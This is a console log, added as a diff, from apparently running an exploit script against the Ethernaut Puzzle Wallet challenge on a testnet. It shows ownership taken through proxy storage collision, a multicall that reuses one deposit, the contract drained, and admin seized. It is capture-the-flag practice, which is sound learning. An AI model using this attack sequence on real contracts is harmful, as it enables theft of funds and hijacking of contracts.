@@ -1,0 +1,50 @@
+PS C:\VScode\web3\140-ethernaut-puzzle-wallet>    npx hardhat run scripts/exploit-puzzle-wallet.ts --network optimismSepolia
+Compiling your Solidity contracts...
+
+Nothing to compile
+
+🎯 開始攻擊 PuzzleWallet 合約...
+📍 目標合約地址: 0xE74c72FaFfd010eE82E4a6Bd529dE147D4747574
+👤 攻擊者地址: 0xdb4101e7f5e2cc0e1a749092ff5287e3d36a5df6
+
+📊 檢查初始狀態...
+當前 admin: 0x25141B6345378e7558634Cf7c2d9B8670baFA417
+當前 owner: 0x25141B6345378e7558634Cf7c2d9B8670baFA417
+合約當前餘額: 0.001 ETH
+攻擊者是否在白名單: false
+
+🚀 步驟一：呼叫 proposeNewAdmin 成為 owner...
+✅ proposeNewAdmin 交易完成: 0x6c6fa93b77a7ce74e6d7e063c50e22e2c9a6442aed436fedaa7dec8b4e0f77f3
+⏳ 等待 owner 狀態更新...
+第 1 次檢查 owner: 0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6
+✅ 成功成為 owner！
+
+🚀 步驟二：將自己加入白名單...
+✅ addToWhitelist 交易完成: 0xdca485c17b1df9fbf6db07d73a399b3f0d52abadd5144a320c11cb535a39e3c8
+⏳ 等待狀態更新...
+第 1 次檢查白名單狀態: true
+
+🚀 步驟三：檢查是否需要 multicall 攻擊...
+合約有餘額，執行 multicall 攻擊...
+發送 multicall 交易，金額: 0.001 ETH
+✅ multicall 交易完成: 0x9a517595b47012dff1b85c7411fa72edc2eaa650455af3fcfd34fd30e3301884
+攻擊者內部餘額: 0.002 ETH
+合約新餘額: 0.002 ETH
+
+🚀 步驟四：清空合約餘額...
+準備提取金額: 0.002 ETH
+✅ execute 交易完成: 0xf4bae4ff9fdea18942358b06929c0a34cce91c7ceac05aeac40f703865936809
+⏳ 等待餘額更新...
+第 1 次檢查合約餘額: 0 ETH
+最終合約餘額: 0 ETH
+
+🚀 步驟五：呼叫 setMaxBalance 成為 admin...
+✅ setMaxBalance 交易完成: 0x4a8bffc2b651840257ab481ef21095161f359273763b2bfda9ae1d2476983d78
+
+🎉 驗證攻擊結果...
+最終 admin: 0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6
+攻擊者地址: 0xdb4101e7f5e2cc0e1a749092ff5287e3d36a5df6
+🎊 攻擊成功！你現在是合約的 admin！
+
+✅ 腳本執行完成
+PS C:\VScode\web3\140-ethernaut-puzzle-wallet>
